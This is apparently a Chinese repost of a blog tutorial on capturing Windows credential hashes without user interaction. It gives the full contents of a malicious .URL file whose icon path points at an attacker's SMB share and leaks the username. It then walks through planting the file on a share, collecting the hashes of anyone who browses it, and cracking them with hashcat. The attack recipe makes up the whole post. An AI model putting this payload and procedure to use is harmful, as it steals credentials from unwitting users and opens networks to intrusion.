# 一种无需用户交互捕获哈希的方法

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MjM5NjA0NjgyMA==&mid=2651071558&idx=4&sn=bcbd44609d108231a8af5ccac2a5d9fd&chksm=bd1fb6cd8a683fdb1eab65f7a3f31630df0a8ddacc390b02176a34d905d8a679d1a95d64285d&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651071558&idx=4&sn=bcbd44609d108231a8af5ccac2a5d9fd&chksm=bd1fb6cd8a683fdb1eab65f7a3f31630df0a8ddacc390b02176a34d905d8a679d1a95d64285d&scene=27#wechat_redirect)

**这段时间我在微博上翻看了大量的帖子，其中有一篇来自@insertscript的帖子，介绍了一种无交互式抓取哈希值的技巧。其使用.URL文件访问环境变量，用户无需任何用户交互即可连接到攻击者的文件共享。**

以下内容摘自@insertscript的帖子：

> “只要explorer.exe的的查看包含.URL文件的文件夹，它就会在发送实际请求之前查找任何指定的环境变量，如％PATH％或％USERNAME％，从而将内容泄露给由攻击者控制的服务器。“（https://insert-script.blogspot.com/2018/08/leaking-environment-variables-in\_20.html）

首先，我们在攻击机上设置SMBListener（通常情况下在内网环境中，大多数公司都会阻止SMB流量出站）。

![](../Images/ce141d871b365b751fa777c9d8d99829.png)

接着，我们在文件共享上创建一个文本文件。（创建文件后，你可以将其放在任何共享上）。

![](../Images/81fd6a5f7c58af0350adfbc280384f83.png)

将以下内容粘贴到文本文件中：

```
[InternetShortcut]URL=whateverWorkingDirectory=whateverIconFile=\\PutYourSmbListenerShareHere\%USERNAME%.iconIconIndex=1
```

以上你只需将IconFile PATH替换为你在SMBServer，Responder或Inveigh中设置的共享即可。注意：这里的％USERNAME％。icon不要改动。如下：

![](../Images/f409b7bd0096df6d30718cf2b41d72e9.png)

现在，请确保你已勾选文件名扩展和隐藏文件选项。

![](../Images/9a19936276185349520f0a41dca9ca07.png)

使用.URL扩展重命名文件注意：当使用相同文件名时，将导致无法正常工作因此，建议大家每次都只创建唯一的文件名（例如1.url，2.url等）！

![](../Images/bd49f1e748c8598c59de25ac70ea6dcf.png)

重命名后应该看起来像下面这样：

![](../Images/822dfa50a7760ffc896de9e2f0fe114c.png)

此时，在你的smb listener应该已经获取到了一个连接！

![](../Images/efd8df97b2726ec0b66acb0745232ab2.png)

现在，任何人只要访问该共享，都将尝试自动的向你的SMB listener进行身份验证。

复制哈希并使用hashcat破解。

![](../Images/deae79159db00bfccbd32fd7d6def931.png)

将其粘贴到文件中

![](../Images/dec7b13103788aadd790dbca52a72509.png)

启动hashcat（希望密码包含在你的字典列表中）

![](../Images/e39174cbb279c1f4bc45b2f08dd5c876.png)

成功解出了密码！

![](../Images/798ae07e18ed33016807cf111319defe.png)
